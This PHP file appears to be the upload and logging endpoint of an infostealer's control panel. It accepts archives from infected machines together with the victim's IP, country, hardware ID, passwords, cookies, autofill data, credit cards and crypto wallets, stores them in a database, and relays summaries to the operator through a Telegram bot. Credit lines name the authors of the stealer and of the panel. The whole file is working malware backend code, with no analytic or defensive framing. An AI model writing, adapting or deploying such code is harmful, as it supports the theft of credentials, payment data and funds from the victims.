<?php
require_once '../config.php';
//session_start();

//check_authorization();

if (!isset($_FILES['file']) || !isset($_POST['info'])) {
    http_response_code(400);
    echo json_encode(['error' => 'File and info are required']);
    exit();
}

$file = $_FILES['file'];
$info = $_POST['info'];

list($ip, $country, $countryCode, $hwid, $passwords, $cookies, $autofills, $creditCards, $wallets, $filename) = explode('$', $info);

if (empty($hwid) || empty($filename)) {
    http_response_code(400);
    echo json_encode(['error' => 'HWID and filename are required']);
    exit();
}

$pdo = connect_db();

$stmt = $pdo->prepare("SELECT * FROM logs WHERE hwid = :hwid");
$stmt->execute(['hwid' => $hwid]);
$existingLog = $stmt->fetch(PDO::FETCH_ASSOC);

if ($existingLog) {
    $deleteStmt = $pdo->prepare("DELETE FROM logs WHERE hwid = :hwid");
    $deleteStmt->execute(['hwid' => $hwid]);

    if (!empty($existingLog['downloadLink']) && file_exists($existingLog['downloadLink'])) {
        unlink($existingLog['downloadLink']);
    }
}

$logsDir = 'logs/';
if (!is_dir($logsDir)) {
    mkdir($logsDir, 0755, true);
}

$uploadFilePath = $logsDir . basename($file['name']);

if (move_uploaded_file($file['tmp_name'], $uploadFilePath)) {
    $downloadLink = $uploadFilePath;

    $insertStmt = $pdo->prepare("
        INSERT INTO logs (ip, country, countryCode, hwid, passwords, cookies, autofills, creditCards, wallets, downloadLink)
        VALUES (:ip, :country, :countryCode, :hwid, :passwords, :cookies, :autofills, :creditCards, :wallets, :downloadLink)
    ");
    
    $insertStmt->execute([
        'ip' => $ip,
        'country' => $country,
        'countryCode' => $countryCode,
        'hwid' => $hwid,
        'passwords' => $passwords,
        'cookies' => $cookies,
        'autofills' => $autofills,
        'creditCards' => $creditCards,
        'wallets' => $wallets,
        'downloadLink' => $downloadLink
    ]);

    echo json_encode(['success' => 'File uploaded and log saved']);

    if ($send_to_telegram) {
        $message = "📂 New Log from: $countryCode\n";
        $message .= "🌐 IP: {$ip} ($country)\n";
        $message .= "🍪 Cookies: {$cookies}\n";
        $message .= "🔑 Passwords: {$passwords}\n";
        $message .= "💳 CreditCards: {$creditCards}\n";
        $message .= "💰 Wallets: {$wallets}\n";
        $message .= "stealer coded by @TheDyer & @webster480\n";
        $message .= "panel coded by @NextroStat";

        sendTelegramMessage($telegram_bot_token, $telegram_chat_id, $message);
    }
} else {
    http_response_code(500);
    echo json_encode(['error' => 'Failed to upload file']);
}

function sendTelegramMessage($token, $chat_id, $message) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";

    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}
